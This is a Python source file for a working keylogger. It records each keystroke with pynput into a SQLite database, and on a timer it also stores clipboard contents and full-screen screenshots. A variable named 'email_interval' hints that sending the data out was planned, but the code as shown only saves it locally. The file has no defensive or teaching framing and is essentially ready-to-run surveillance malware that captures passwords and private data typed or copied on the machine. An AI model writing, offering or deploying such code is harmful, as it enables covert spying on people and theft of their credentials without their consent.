import os
import pynput
import pyperclip
import sqlite3  # New library for SQLite integration
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from datetime import datetime
import threading


log_file = "keylog.txt"
clipboard_file = "clipboard.txt"
screenshot_folder = "screenshots"
email_interval = 60  # Time in seconds to save data

# Ensure the screenshot folder exists
if not os.path.exists(screenshot_folder):
    os.makedirs(screenshot_folder)

# Database setup
db_file = "keylogger.db"

# Create and connect to the SQLite database
def create_database():
    conn = sqlite3.connect(db_file)
    cursor = conn.cursor()
    
    # Create tables for keystrokes, clipboard, and screenshots
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            keystroke TEXT
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS clipboard (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            clipboard_data TEXT
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            file_path TEXT
        )
    ''')

    conn.commit()
    conn.close()

# Function to log keystrokes into the database
def log_keystroke(key):
    conn = sqlite3.connect(db_file)
    cursor = conn.cursor()
    
    # Capture timestamp
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Log the key to the database
    try:
        cursor.execute("INSERT INTO keystrokes (timestamp, keystroke) VALUES (?, ?)", (timestamp, key.char))
    except AttributeError:
        if key == Key.space:
            cursor.execute("INSERT INTO keystrokes (timestamp, keystroke) VALUES (?, ?)", (timestamp, ' '))
        else:
            cursor.execute("INSERT INTO keystrokes (timestamp, keystroke) VALUES (?, ?)", (timestamp, str(key)))

    conn.commit()
    conn.close()

# Function to log clipboard data into the database
def log_clipboard():
    conn = sqlite3.connect(db_file)
    cursor = conn.cursor()
    
    try:
        clipboard_data = pyperclip.paste()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        cursor.execute("INSERT INTO clipboard (timestamp, clipboard_data) VALUES (?, ?)", (timestamp, clipboard_data))
    except Exception as e:
        print(f"Error logging clipboard: {e}")

    conn.commit()
    conn.close()

# Function to take screenshots and save the file path in the database
def take_screenshot():
    conn = sqlite3.connect(db_file)
    cursor = conn.cursor()

    screenshot_path = os.path.join(screenshot_folder, f"{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png")
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_path)

    # Save screenshot file path and timestamp to the database
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute("INSERT INTO screenshots (timestamp, file_path) VALUES (?, ?)", (timestamp, screenshot_path))

    conn.commit()
    conn.close()

# Function to periodically save logs and take screenshots
def periodic_tasks():
    log_clipboard()    # Log clipboard data
    take_screenshot()  # Take a screenshot
    threading.Timer(email_interval, periodic_tasks).start()  # Schedule next task

# Function to stop logging when 'esc' is pressed
def stop_logging(key):
    if key == Key.esc:
        return False

# Main function to run everything
if __name__ == "__main__":
    # Create the database and tables if they don't exist
    create_database()

    # Start the listener to monitor keystrokes
    with Listener(on_press=log_keystroke, on_release=stop_logging) as listener:
        # Start the periodic task for logging clipboard data and taking screenshots
        periodic_tasks()
        listener.join()
